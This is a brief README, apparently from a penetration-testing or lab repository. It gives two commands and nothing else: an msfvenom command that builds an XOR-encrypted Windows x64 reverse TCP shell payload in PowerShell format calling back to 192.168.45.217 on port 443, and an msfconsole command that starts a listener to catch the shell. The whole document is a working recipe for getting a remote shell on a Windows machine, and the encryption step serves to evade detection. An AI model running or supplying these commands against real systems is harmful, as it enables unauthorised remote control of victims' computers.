# readme

Generate Payload

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=443 EXITFUNC=thread -f ps1 --encrypt xor --encrypt-key z 
```

Start Listener

```rust
msfconsole -q -x "use multi/handler; set payload windows/x64/shell/reverse_tcp; set lhost 192.168.45.217; set lport 443; exploit" 
```

Change the payload type based on what you want your shell to be
